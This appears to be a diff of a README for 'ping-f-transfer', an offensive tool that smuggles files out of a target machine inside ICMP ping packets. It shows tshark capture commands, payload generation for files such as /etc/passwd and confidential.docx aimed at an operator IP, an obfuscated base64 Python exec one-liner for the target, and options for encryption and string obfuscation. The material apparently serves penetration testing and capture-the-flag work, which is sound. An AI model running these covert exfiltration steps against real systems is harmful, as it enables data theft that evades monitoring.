@@ -95,7 +95,7 @@ In the machine we want to save the file, execute:
 # Capture ICMP packets
 sudo tshark -i tun0 -l -Y 'icmp.type==8 && ip.src==10.10.10.50' -T fields -e data.data > capture.hex
 ```
-Where `10.10.10.50` is the IP of the machine containing the file we want to transfer and `tun0` is the network interface name that allow connections to that target machine.
+Where `10.10.10.50` is the IP of the machine containing the file we want to transfer, `tun0` is the network interface name that allow connections to that target machine and `capture.hex` is the file that will store the received ICMP packets.
 
 ### Step 2: Transfer file using 'ping' with 'ping-f-transfer'
 In the machine we want to save the file (same as previous step, but another terminal) we use `generate` command (recommended). This generates a oneliner command that can be later executed in the machine we want to transfer
@@ -103,10 +103,10 @@ In the machine we want to save the file (same as previous step, but another term
 # Generate a oneliner to paste on the sender machine
 ping-f-transfer generate -f '/tmp/secret.txt' -i 10.10.14.5 -l python
 ```
-Where `10.10.14.5` is the machine we will transfer the file, and `/tmp/secret.txt` is the absolute path for the file we want to transfer in the target machine.
+Where `10.10.14.5` is the machine we will transfer the file (our machine), and `/tmp/secret.txt` is the absolute path for the file we want to transfer in the target machine.
 
 ### Step 3: Execute generated payload in target machine to transfer file
-We can now execute the command generated on `Step 3` in the target machine (the machine that contains the file we want to transfer `/tmp/secret.txt`):
+We can now execute the command generated on `Step 3` in the target machine, the machine that contains the file we want to transfer (file `/tmp/secret.txt` in this example):
 ```bash
 # Executing generated payload by 'ping-f-transfer' in the machine we want to transfer the file (target machine) 
 python3 -c "exec(__import__('base64').b64decode(b'aW1w<SNIP>KQo=').decode())"
@@ -122,9 +122,10 @@ We can then decode captured packets to build the original file and complete the 
 LC_ALL=C sort -u capture.hex | cut -c7- | xxd -r -p > secret.txt
 
 # (Optional, but recommended) Verify integrity
-# Script output shows the original SHA256-hash to compare
+# Script output shows the original SHA-256 hash file to compare
 sha256sum secret.txt
 ```
+Depending on the flags used (for example, if we want to encrypt the packets sent), the script also provides the indicated command to decode the file.
 
 ---
 
@@ -326,36 +327,19 @@ Available for all subcommands (`transfer`, `generate`, `makefile`):
 | `--decoded-filename NAME` | Customize filename in decode instructions | `output_file` |
 | `--no-banner` | Suppress the ASCII banner | off |
 
-> **Important:** Always use **absolute paths** with `-f` and **quote them** if they contain spaces or backslashes. The file path is embedded into the generated payload, and relative or unquoted paths can break the resulting script.
+>[!IMPORTANT]
+> Always use **absolute paths** with `-f` and **quote them** if they contain spaces or backslashes. The file path is embedded into the generated payload, and relative or unquoted paths can break the resulting script.
 >
 > ```bash
 > # Good
 > ping-f-transfer generate -f '/tmp/my file.txt' -i 10.10.14.5 -l python
 > ping-f-transfer generate -f 'C:\Users\admin\flag.txt' -i 10.10.14.5 -l powershell
 >
-> # Bad — backslashes and spaces may break the payload
+> # Bad/not recommended — backslashes and spaces may break the payload
 > ping-f-transfer generate -f C:\Users\admin\flag.txt -i 10.10.14.5 -l powershell
 > ping-f-transfer generate -f ../relative/path.txt -i 10.10.14.5 -l python
+> ping-f-transfer generate -f '../relative/file with spaces.txt' -i 10.10.14.5 -l php
 > ```
-
-### `generate`-only Flags
-
-| Flag | Description | Default |
-|---|---|---|
-| `-l, --language LANG` | Payload language (**required**) | — |
-| `--randomize-var` | Randomize variable names | off |
-| `--split-payload [N]` | Split payload into N chunks (2–10) | off |
-| `--obfuscate-strings` | XOR-encode file path, IP, and passphrase | off |
-
-### `makefile`-only Flags
-
-| Flag | Description | Default |
-|---|---|---|
-| `-l, --language LANG` | Script language (**required**) | — |
-| `-o, --output-file FILE` | Output file path | `generated_ping_f_transfer.<ext>` |
-| `--randomize-var` | Randomize variable names | off |
-| `--create-script-for OS` | Target OS for Go/C (required for Go/C) | — |
-| `--obfuscate-strings` | XOR-encode file path, IP, and passphrase | off |
 
 ---
 
@@ -384,8 +368,8 @@ ping-f-transfer generate -f /etc/passwd -i 10.10.14.5 -l python \
 ### Generate a compiled binary for Windows
 
 ```bash
-# C binary with encryption for Windows
-ping-f-transfer makefile -f C:\Users\admin\confidential.docx -i 10.10.14.5 -l c \
+# C binary with encryption for Windows, use absolute path and quote the path of the file
+ping-f-transfer makefile -f 'C:\Users\admin\confidential.docx' -i 10.10.14.5 -l c \
   --create-script-for windows --encrypt --enc-passphrase 'P@ssw0rd!' --compress
 ```
 
